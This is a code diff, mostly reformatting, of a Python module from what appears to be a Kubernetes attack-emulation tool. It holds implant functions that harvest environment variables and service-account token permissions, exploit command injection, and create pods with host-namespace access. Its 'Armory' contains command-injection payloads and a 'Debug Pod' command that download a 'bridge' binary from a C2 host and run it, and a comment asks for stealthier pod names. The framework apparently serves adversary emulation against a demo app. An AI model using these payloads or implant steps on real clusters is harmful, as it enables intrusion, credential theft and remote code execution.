@@ -33,8 +33,8 @@ async def read_service_account_token(implant: Implant, *args, **kwargs) -> event
 async def read_environment_variables(implant: Implant, *args, **kwargs) -> events.Event | None:
     # TODO make this C2 agnostic
     session = await implant.client.interact_session(implant.session_id)
-    res = await session.execute('env', args=None)
-    stdout = res.Stdout.decode('utf-8')
+    res = await session.execute("env", args=None)
+    stdout = res.Stdout.decode("utf-8")
     env_vars = {}
     for line in stdout.split("\n"):
         if line.strip() != "":
@@ -43,9 +43,7 @@ async def read_environment_variables(implant: Implant, *args, **kwargs) -> event
     return events.EnvironmentVariablesExtracted(source_system_id=implant.system_id, variables=env_vars)
 
 
-async def get_sa_token_permission(
-    implant: Implant, serviceaccount: ServiceAccount, *args, **kwargs
-) -> events.Event | None:
+async def get_sa_token_permission(implant: Implant, serviceaccount: ServiceAccount, *args, **kwargs) -> events.Event | None:
     # async def get_sa_token_permission(implant: Implant, sa_token: ServiceAccountToken | None = None) -> events.Event | None:
     session = await implant.client.interact_session(implant.session_id)
     # TODO currently requires cURL -are any pre-requisite checks requ has curl?
@@ -65,7 +63,7 @@ async def get_sa_token_permission(
         CA_PATH,
         "-H",
         f"Authorization: Bearer {serviceaccount.token.raw}",
-        "-H" "Accept: application/json, */*",
+        "-HAccept: application/json, */*",
         "-H",
         "Content-Type: application/json",
         f"{serviceaccount.token.issuer}/apis/{api_version}/selfsubjectrulesreviews",
@@ -75,7 +73,7 @@ async def get_sa_token_permission(
     ]
     res = await session.execute("curl", args=args)
     if res.Status == 0:
-        result = res.Stdout.decode('utf-8')
+        result = res.Stdout.decode("utf-8")
         rules_review = json.loads(result)
         return events.TokenCapabilitiesQueried(
             # TODO should the source system really be the system with the implant? this request could be done on any other pod as well
@@ -85,19 +83,19 @@ async def get_sa_token_permission(
             non_resource_rules=rules_review["status"]["nonResourceRules"],
         )
     else:
-        reason = res.Stderr.decode('utf-8')
+        reason = res.Stderr.decode("utf-8")
         msg = f"Could not retrieve permissions: {reason}"
         return events.UiEvent(type=events.EventType.Error, data=msg)
 
 
 async def list_available_binaries(implant: Implant, *args, **kwargs) -> events.Event | None:
     session = await implant.client.interact_session(implant.session_id)
-    res = await session.execute('dpkg', args=["-l"])
-    stdout = res.Stdout.decode('utf-8')
+    res = await session.execute("dpkg", args=["-l"])
+    stdout = res.Stdout.decode("utf-8")
     binaries = {}
     if stdout:
         for line in stdout.split("\n"):
-            if line.startswith(('ii', 'hi', 'rc', 'pi', 'pu')):
+            if line.startswith(("ii", "hi", "rc", "pi", "pu")):
                 columns = line.split()
                 if len(columns) >= 3:
                     state, name, version, *_ = columns
@@ -109,20 +107,18 @@ async def list_available_binaries(implant: Implant, *args, **kwargs) -> events.E
     return events.SystemBinariesListed(source_system_id=implant.system_id, binaries=binaries)
 
 
-async def exploit_cmd_injection(
-    implant: Implant, target: Pod | Service, ttp: TTP, *args, target_url: str = "", params: dict = {}, **kwargs
-) -> events.Event | None:
+async def exploit_cmd_injection(implant: Implant, target: Pod | Service, ttp: TTP, *args, target_url: str = "", params: dict = {}, **kwargs) -> events.Event | None:
     session = await implant.client.interact_session(implant.session_id)
     payload = "".join(f"{k}={v}" for k, v in params.items())
 
     res = await session.execute(
-        'curl',
+        "curl",
         args=[target_url, "-L", "--get", "--data-urlencode", payload],
     )
     return None
 
 
-async def deploy_pod(implant: Implant, pod: Pod, ttp: TTP,  *args, params:dict=None, **kwargs):
+async def deploy_pod(implant: Implant, pod: Pod, ttp: TTP, *args, params: dict = None, **kwargs):
     session = await implant.client.interact_session(implant.session_id)
 
     assert pod.service_account is not None
@@ -130,16 +126,15 @@ async def deploy_pod(implant: Implant, pod: Pod, ttp: TTP,  *args, params:dict=N
 
     api_url = f"{sa_token.issuer}/api/v1/namespaces/{pod.ns}/pods"
 
-    name = params.get("name", f"ran-{session.last_checkin}") # TODO default podname should be stealthier
+    name = params.get("name", f"ran-{session.last_checkin}")  # TODO default podname should be stealthier
     name = name.lower().replace(" ", "-")  # make it RFC 1123 compliant
     pod_spec = k8s.PodSpec(
-        name=name, 
+        name=name,
         ns=kwargs.get("namespace", pod.ns),
-        containers=[
-            k8s.Container(name=name, image=params.get("image", "busybox"), cmd=params["cmd"], args=params["args"])],
-        host_network= params.get("useHostNetwork", None),
-        host_ipc = params.get("useHostIPC", None),
-        host_pid =params.get("useHostPID", None),
+        containers=[k8s.Container(name=name, image=params.get("image", "busybox"), cmd=params["cmd"], args=params["args"])],
+        host_network=params.get("useHostNetwork", None),
+        host_ipc=params.get("useHostIPC", None),
+        host_pid=params.get("useHostPID", None),
     )
 
     args = [
@@ -148,49 +143,47 @@ async def deploy_pod(implant: Implant, pod: Pod, ttp: TTP,  *args, params:dict=N
         CA_PATH,
         "-H",
         f"Authorization: Bearer {sa_token.raw}",
-        "-H" "Accept: application/json, */*",
+        "-HAccept: application/json, */*",
         "-H",
         "Content-Type: application/json",
         api_url,
         # f"https://{api_server_ip}:{api_server_port}/apis/{api_version}/selfsubjectrulesreviews",
         "--data",
-        pod_spec.model_dump_json()
+        pod_spec.model_dump_json(),
     ]
     res = await session.execute("curl", args=args)
     if res.Status == 0:
-        raw_result = res.Stdout.decode('utf-8')
+        raw_result = res.Stdout.decode("utf-8")
         result = json.loads(raw_result)
         result_kind = result["kind"]
 
         if result_kind == "Pod":
-        # if r.code == 200:
+            # if r.code == 200:
             # TODO return pod created event
             return events.ResourceCreated(resource=result)
         else:
             status = ApiStatus(**result)
-            if status.code == 409: # resource exists already
-                return events.UiEvent(type=events.EventType.Error, data= f"Couldn't create pod: '{r.message}'")
+            if status.code == 409:  # resource exists already
+                return events.UiEvent(type=events.EventType.Error, data=f"Couldn't create pod: '{r.message}'")
             else:
-                return events.UiEvent(type=events.EventType.Error, data= f"Couldn't create pod: '{r.message}'")
-        
-
+                return events.UiEvent(type=events.EventType.Error, data=f"Couldn't create pod: '{r.message}'")
 
     else:
-        reason = res.Stderr.decode('utf-8')
+        reason = res.Stderr.decode("utf-8")
         msg = f"cURL request unsuccessful: {reason}"
         return events.UiEvent(type=events.EventType.Error, data=msg)
 
 
-    a = 5
 class StatusDetails(BaseModel):
     name: str | None = None
     kind: str | None = None
     phase: str | None = None
 
+
 class ApiStatus(BaseModel):
     kind: str
     apiVersion: str
-    metadata: object ={}
+    metadata: object = {}
     status: str
     message: str
     reason: str
@@ -212,7 +205,7 @@ class Armory:
                 technique=Technique.ExploitPublicFacingApp,
                 params=ExploitParams(
                     endpoint="http://unguard.kube/healthz",
-                    params={"path": '127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &'},
+                    params={"path": "127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"},
                     method="GET",
                 ),
             ),
@@ -223,7 +216,7 @@ class Armory:
                 execute=exploit_cmd_injection,
                 params=ExploitParams(
                     endpoint="$TARGET/image",
-                    params={"url": '127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &'},
+                    params={"url": "127.0.0.1; curl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b &"},
                     method="GET",
                 ),
             ),
@@ -285,15 +278,15 @@ class Armory:
                 # requires={"can": "create pods"},
                 execute=deploy_pod,
                 params=DeployPodParams(
-                    name='Debug Pod',
-                    cmd= "/bin/bash",
-                    args= ["-c", "kurl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b"],
+                    name="Debug Pod",
+                    cmd="/bin/bash",
+                    args=["-c", "kurl $C2/static/bridge -o /tmp/b; chmod +x /tmp/b; /tmp/b"],
                     image="r0binak/mtkpi:v1",
                     ports=[
-                        {"containerPort": 7681}, # TTYD port for web shell, might be skipped
+                        {"containerPort": 7681},  # TTYD port for web shell, might be skipped
                     ],
                 ),
-            )
+            ),
             # TTP(  # video for implementation KubeCon NA'23: https://www.youtube.com/watch?v=mqnm0AXoNgc
             #     # TODO implement
             #     name="Sidecar Injection",
